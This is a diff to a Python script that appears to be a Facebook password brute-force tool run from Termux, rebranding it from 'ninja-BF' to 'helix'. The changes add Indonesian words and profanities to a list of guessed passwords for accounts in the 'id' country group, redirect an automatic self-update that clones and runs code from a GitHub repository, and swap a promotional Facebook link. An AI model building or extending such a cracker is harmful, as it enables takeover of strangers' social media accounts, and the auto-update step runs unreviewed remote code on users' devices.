@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ Chenglie
+# Made With ❤️ ./Helix
 
 import requests,mechanize,subprocess,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
 from random import randint
@@ -48,7 +48,7 @@ versi = "1.5"
 if versi != vers:
     print("SC PERLU DIPERBAHARUI")
     print(b+"INFO UPDATE : "+k+pesan+p)
-    os.system('cd && rm -rf ninja-BF && git clone https://github.com/jukill/ninja-BF && cd ninja-BF && python ninja.py')
+    os.system('cd && rm -rf ninja-BF && git clone https://github.com/r0zhakID/helix && cd helix && python helix.py')
     exit()
     
     
@@ -68,7 +68,7 @@ else:
 ### HEADERS ###
 
 def banner():
-    os.system("cat banner.txt")
+    os.system("cat banner1.txt")
     
 host="https://mbasic.facebook.com"
 ok = []
@@ -380,7 +380,7 @@ def choose_menu():
 		try:
 			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks")
 			os.system("rm -rf login.txt")
-			os.system("termux-open-url https://www.facebook.com/OLDFB.01")
+			os.system("termux-open-url https://www.facebook.com/01thstar")
 			exit()
 		except Exception as e:
 			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
@@ -672,8 +672,13 @@ def generate(text):
 				if "id" in ct:
 					results.append("sayang")
 					results.append("bismillah")
+					results.append("cintaku")
+					results.append("indonesia")
+					results.append("sayangku")
+					results.append("kontol")
+					results.append("bangsat")
 					results.append("anjing")
-					results.append("123456")
+					results.append("sayangkamu")
 				elif "bd" in ct:
 					results.append("786786")
 					results.append("000786")
